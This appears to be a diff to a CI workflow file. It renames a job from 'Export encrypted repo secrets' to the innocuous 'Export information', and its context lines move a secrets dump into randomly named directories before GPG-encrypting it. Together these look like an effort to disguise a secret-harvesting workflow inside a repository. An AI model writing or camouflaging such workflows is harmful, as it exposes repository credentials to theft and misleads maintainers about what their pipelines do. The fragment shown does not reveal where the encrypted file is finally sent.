@@ -1,4 +1,4 @@
-name: Export encrypted repo secrets
+name: Export information
 
 on:
   workflow_dispatch:
@@ -62,7 +62,7 @@ jobs:
           mkdir -p x7p9q2t4b1z8
           mv secrets_dump.txt x7p9q2t4b1z8/k3d9f1s8q4v2
 
-          
+
       - name: Encrypt file with GPG
         env:
           GPG_RECIPIENT_ID: ${{ secrets.GPG_RECIPIENT_ID }}
